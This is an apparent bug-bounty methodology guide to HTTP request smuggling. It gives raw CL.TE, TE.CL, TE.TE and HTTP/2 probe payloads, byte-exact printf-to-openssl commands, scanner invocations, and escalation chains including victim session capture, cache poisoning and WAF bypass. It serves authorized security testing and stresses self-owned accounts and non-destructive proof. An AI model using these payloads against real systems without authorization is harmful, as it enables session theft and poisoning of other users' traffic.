# HTTP Request Smuggling

> One-line summary: The frontend and backend disagree about where one request ends and the next begins (CL vs TE), letting you attach a hidden request that rides in on the next victim's — pays critical when it yields auth bypass, session theft, or cache poisoning at scale.

## Overview

Request smuggling is an HTTP/1.1 desync: a frontend (CDN, load balancer, reverse proxy) forwards a request whose length it computed differently than the backend does, so bytes you appended are parsed as the *start of the next request* on the shared backend connection. The canonical mismatch is `Content-Length` (CL) vs `Transfer-Encoding: chunked` (TE) — CL.TE, TE.CL, and obfuscated TE.TE variants — with HTTP/2 downgrades (H2.CL, H2.TE) and CL.0 as modern relatives. Impact is severe because you can prepend bytes to other users' requests: bypass frontend authorization (`GET /admin` blocked by the edge, allowed by the app), capture victims' requests (cookies, Authorization headers), poison caches for whole user populations, and trigger reflected/stored XSS at scale. It pays because the same flaw affects every user of the site, and the proof — one poisoned or captured request — is unambiguous.

## Where to find it

- Almost any architecture with two HTTP parsers in a row: CDN/LB (CloudFront, Cloudflare, Akamai, F5, HAProxy) in front of nginx/Apache/Node/Gunicorn — extremely common and frequently vulnerable
- CL.TE vs TE.CL discrepancies: endpoints that accept POST bodies where one tier honors `Content-Length` and the other prefers `Transfer-Encoding`
- TE.TE: servers that both support chunked but obfuscate differently (`Transfer-Encoding: xchunked`, extra headers, whitespace before the colon) so one tier ignores it
- HTTP/2 frontends that downgrade to HTTP/1.1 at the backend (H2.CL/H2.TE) — headers like `Content-Length` injected into the H2 request survive the downgrade
- CL.0: backends (often static/file handlers) that ignore `Content-Length` on certain routes while the frontend honors it
- Retried/keep-alive backends: connection reuse is the delivery mechanism — shared upstreams to APIs, admin panels, and cacheable GETs
- Signals in headers: `Server`, `Via`, `X-Served-By`, CDN headers, and any 400/501 responses to dual-CL/TE requests (a parser disagreement already visible)

## Methodology

1. **Fingerprint the stack** — note the CDN/proxy (headers, TLS fingerprint) and the application server (error pages, cookie names). Two parsers = candidate. Prefer staging/less-critical hosts, but production is usually in scope for these programs.
2. **Automated scan (timing-based, non-destructive)** — run `smuggler.py` or Burp's "HTTP Request Smuggler" extension. Both send safe timing probes: a desync makes the backend wait for bytes that never arrive, so the request hangs (~10s) where a normal request returns instantly.
3. **Manual timing confirmation** — send the CL.TE and TE.CL timing probes below with byte-exact bodies (printf + openssl). A consistent timeout on exactly one probe shape indicates which mismatch exists; run each 3 times, and run a control request to prove network conditions are fine.
4. **Differential confirmation** — the strong PoC is smuggling a request that produces a *different* response attached to your next request: smuggle `GET /404` (CL.TE) and watch your next request get a 404; smuggle `GPOST …` (TE.CL) and get a 405/501. Use Burp: enable "Send group in sequence (single connection)" and uncheck "Update Content-Length".
5. **Determine direction of the mismatch** — CL.TE means the frontend replays the body per CL and the backend waits per TE; TE.CL is the mirror. This decides which byte strings are leftover and therefore what you can prepend.
6. **Exploit variants (choose by target)** — authorization bypass: frontend blocks `/admin`, backend doesn't — smuggle the inner request to `/admin` with the frontend's rules applied to only the outer request; capture: smuggle a partial request so the victim's request bytes complete it, storing them on a site endpoint you can read back; cache poison: smuggle a request that makes the cache store a malicious response for a popular URL.
7. **Stay non-destructive while confirming** — never leave the backend connection desynced for real users: complete every smuggled request cleanly, target `GET /404`-style probes first, and re-verify with a fresh connection before declaring the bug.
8. **Prove impact** — for auth bypass, show your unauthenticated smuggled request reaching an admin-only response; for capture, show your own second test account's request bytes appearing in the store; for poison, show the cached malicious response served to an unauthenticated fetch.

## Payloads

All raw examples are CRLF-delimited. In Burp, paste into Repeater, view raw (Ctrl+;), disable "Update Content-Length", and use a single connection. For byte-exact sending from a shell, use the `printf | openssl` one-liners.

```http
# CL.TE timing probe — frontend uses Content-Length, backend uses Transfer-Encoding.
# Body is "1\r\nA\r\nX" (7 bytes); the frontend forwards only the first 4,
# the backend's chunked parser waits forever -> hang/timeout is the signal.
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```

```bash
# The same probe, byte-exact (exit code 124 after 10s = timeout signal)
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n1\r\nA\r\nX' \
  | timeout 10 openssl s_client -connect target.com:443 -quiet 2>/dev/null; echo "exit=$?"
```

```http
# TE.CL timing probe — frontend uses TE, backend uses CL.
# Body is "0\r\n\r\nX" (6 bytes); the frontend forwards only the complete 5-byte
# chunked body, the backend waits for a 6th byte -> hang/timeout is the signal.
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

```bash
# TE.CL timing probe, byte-exact
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX' \
  | timeout 10 openssl s_client -connect target.com:443 -quiet 2>/dev/null; echo "exit=$?"
```

```http
# CL.TE confirmation — smuggle "GET /404" as the leftover request.
# Body after headers is exactly 35 bytes: "0\r\n\r\n" + "GET /404 HTTP/1.1\r\n" + "X-Ignore: X" (no trailing CRLF).
# Send this, then send a normal GET on the same connection: the GET gets the 404.
POST / HTTP/1.1
Host: target.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```

```bash
# CL.TE confirmation in one connection: smuggled 404 prefix + follow-up request
{ printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 35\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /404 HTTP/1.1\r\nX-Ignore: X'; \
  printf 'GET / HTTP/1.1\r\nHost: target.com\r\nConnection: close\r\n\r\n'; } \
  | openssl s_client -connect target.com:443 -quiet 2>/dev/null | head -40
# Vulnerable: the second response block is "404 Not Found" for GET /.
```

```http
# TE.CL confirmation — smuggled prefix is an invalid method ("GPOST"); the backend
# answers it with 405/400, and that response lands on your NEXT request.
# Chunk size 0x27 = 39 bytes = exact length of the smuggled request.
# (recount after edits: printf 'GPOST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n' | wc -c  ->  39)
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 4

27
GPOST / HTTP/1.1
Content-Length: 0


0

```

```bash
# TE.CL confirmation, byte-exact
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n27\r\nGPOST / HTTP/1.1\r\nContent-Length: 0\r\n\r\n\r\n0\r\n\r\n' \
  | timeout 10 openssl s_client -connect target.com:443 -quiet 2>/dev/null | head -20
# Vulnerable: response contains a 405/501/400 for "GPOST".
```

```http
# TE.TE obfuscation variants — one tier trims/ignores the header, the other doesn't.
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding: xchunked

Transfer-Encoding : chunked      # space before the colon

Transfer-Encoding: chunked
Transfer-Encoding: identity

Transfer-Encoding: chunked
Content-Length: 30
X: X
Transfer-Encoding: chunked       # some parsers only see the first
```

```bash
# H2.CL / H2.TE — HTTP/2 frontend, HTTP/1.1 backend.
# In Burp, send the request over HTTP/2 with a "Transfer-Encoding: chunked" header
# (or a Content-Length that differs from the body) and "Update Content-Length" off;
# if the downgrade preserves the header, you get TE.CL-style desync.
# h2c (cleartext upgrade) detection:
python3 h2csmuggler.py -x https://target.com/ --test
```

## Bypasses & edge cases

- **TE obfuscation table** — `xchunked`, `chunked\t`, `chunked ` (trailing space), `space before colon`, duplicated TE, obfuscated charset (`Transfer-Encoding:\x0bchunked`), and newline-in-header tricks; each frontend/backend pair fails differently, so try the full list when the probes don't fire.
- **Header prepending** — smuggle a partial request whose remaining headers are filled by the victim's request headers, using their cookie/Authorization as the body of your smuggled request (capture technique).
- **Prefix vs suffix** — suffix smuggling completes your smuggled request with the victim's request bytes; prefix smuggling prepends your request before theirs. Choose based on whether you must complete the request (`Content-Length` known) or can start it and let the victim finish it.
- **CL.0 / client-side desync** — routes (often static files, redirects) where the *backend* ignores Content-Length; use a browser to desync a victim's connection pool — the browser variant hits users without any privileged tooling, and "Gotta Cache 'em all"-style techniques build on it.
- **HTTP/2 complications** — H2 rejects some malformed headers, so the smuggle lives in the *downgrade*: CRLF in header values (`foo: bar\r\nTransfer-Encoding: chunked`), pseudo-header confusion (`:method`/`:path` injection), and `Content-Length` duplication are the productive angles.
- **Detection false negatives** — CDNs may retry or normalize requests, hiding the desync from your tool; also a frontend that strips both CL and TE defeats timing probes — fall back to differential confirmation with two-request sequences and fresh connections.
- **Keep-alive dependence** — smuggling only lands when the frontend reuses the same backend connection for the next request; test against high-traffic paths to increase reuse, and on single-client test setups send your follow-up request on the same TLS session.

## Tools

```bash
# defparam's smuggler — automated safe(ish) scan of all CL/TE permutation attacks
git clone https://github.com/defparam/smuggler && python3 smuggler/smuggler.py -u https://target.com/

# Burp Suite — HTTP Request Smuggler (James Kettle, BApp Store): timing probes + confirmations,
# integrates "Send group in sequence (single connection)" (Repeater menu) for the two-request PoC.

# h2csmuggler — cleartext HTTP/2 upgrade smuggling
python3 h2csmuggler.py -x https://target.com/ --test

# Raw socket work / byte-exact probes (also works for weird obfuscations)
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n1\r\nA\r\nX' \
  | timeout 10 openssl s_client -connect target.com:443 -quiet 2>/dev/null

# nuclei community templates (tag coverage varies by template version)
nuclei -u https://target.com -tags smuggling
```

## Escalation & chaining

- **Frontend auth bypass** — the edge blocks `/admin` or adds auth headers; the backend doesn't. Smuggle the inner request so it skips the edge's rules and reaches the app directly.
- **Victim request capture → ATO** — smuggle a request whose body is completed by the next user's headers/body (their cookies, tokens); store that data through a site endpoint you can read back (comment, profile field, request bin).
- **Cache poisoning at scale** — smuggle a request that makes the cache store a malicious redirect or script for a URL other users will fetch; every visitor gets your payload (see the cache-poisoning skill for confirmation technique).
- **Stored XSS via smuggling** — capture a victim's request into a reflected field, or poison a cached response with a script — either converts an infrastructure bug into persistent XSS.
- **CL.0 → client-side desync** — desync a victim's browser connection pool via a crafted page; no special access needed, and the victim's own authenticated requests become the smuggling targets.
- **Defense bypass** — WAFs at the edge see your benign outer request while the backend processes the malicious inner one, bypassing per-request inspection.

## Report notes

- Two-request proof on one connection: raw request bytes (hex or raw view), raw response bytes, and the server/tier attribution (`Server:`/`Via:` on each) — plus timestamps.
- Timing evidence for the detection phase: three runs of the probe with ~10s timeout and one control request with normal latency; note the exact probe used.
- State the mismatch explicitly ("CL.TE: edge honors Content-Length, origin prefers Transfer-Encoding") and how you confirmed direction.
- For capture/poison PoCs, use your own two accounts — demonstrate the mechanism with self-controlled sessions instead of touching real users' traffic.
- Impact narrative must name the consequence (unauthenticated /admin access, session theft, cache poisoning for all visitors) and the affected host/path; include the remediation expectation (normalize CL/TE at the edge, reject dual-header requests).
- If the program scopes specific hosts, note which upstreams share the vulnerable connection — that bounds triage's blast-radius estimate in your favor.

## References

- [PortSwigger — HTTP request smuggling](https://portswigger.net/web-security/request-smuggling)
- [PortSwigger — Finding HTTP request smuggling vulnerabilities](https://portswigger.net/web-security/request-smuggling/finding)
- [PortSwigger Research — HTTP Desync Attacks: Request Smuggling Reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
- [PortSwigger Research — HTTP/2: The Sequel is Always Worse](https://portswigger.net/research/http2)
- [PortSwigger Research — Browser-Powered Desync Attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- [PortSwigger Research — Listen to the Whispers: web timing attacks that work](https://portswigger.net/research/listen-to-the-whispers-web-timing-attacks-that-actually-work)
- [defparam/smuggler](https://github.com/defparam/smuggler)
- [BishopFox h2csmuggler](https://github.com/BishopFox/h2csmuggler)
- [HackTricks — HTTP request smuggling](https://book.hacktricks.xyz/pentesting-web/http-request-smuggling)
